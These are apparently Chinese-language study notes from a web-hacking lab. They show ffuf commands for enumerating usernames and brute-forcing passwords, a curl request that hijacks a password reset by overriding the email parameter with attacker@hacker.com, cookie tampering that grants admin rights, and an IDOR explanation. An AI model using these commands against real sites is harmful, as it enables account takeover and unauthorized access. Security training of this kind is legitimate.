### 一、直接获取帐号
1. 爆破
```shell
    # 利用注册信息的反馈，确认存在的用户
    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.226.236/customers/signup -mr "username already exists"
    # 对个别用户进行密码爆破
    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.226.236/customers/login -fc 200
```

2. 逻辑漏洞
```shell
    ### 利用脚本的语法特性和逻辑不严谨进行利用和攻击
    # $_REQUEST接收GET请求和POST请求的数据，如果参数相同，则倾向于使用POST的请求参数，因此可以直接在POST数据包中传递参数对URL链接的参数进行覆盖

    # 正常请求
    curl 'http://10.10.93.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

    # 不正常请求，attacker@hacker.com会覆盖robert%40acmeitsupport.thm，从而达到攻击目的
    curl 'http://10.10.93.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

    ### 至此，可以通过顶替的邮箱获取密码
```


### 二、越权
1. 垂直越权
```shell
    ### 修改cookie值从而越权
    # 正常访问
    curl http://10.10.93.22/cookie-test

    # 带有cookie,但是为普通权限的访问
    curl -H "Cookie: logged_in=true; admin=false" http://10.10.93.22/cookie-test

    # 通过修改cookie的权限参数来进行越权
    curl -H "Cookie: logged_in=true; admin=true" http://10.10.93.22/cookie-test

    ### 大部分cookie都会进行编码和加密，因此识别编码类型和加密方法是重中之重
```

### 三、不安全的直接对象引用(Insecure Direct Object Reference)
```shell
    ### 利用参数改变，从而获取本不应该查看的内容，通常漏洞出现在web页面的url链接里面
    # 例子：/api/v1/customer?id={user_id} 可以直接更改user_id
    # 常见位置：GET请求、POST数据包、COOKIE及JAVASCRIPT脚本的请求文件
    ### 数值都会进行编码和加密，因此识别编码类型和加密方法是重中之重
```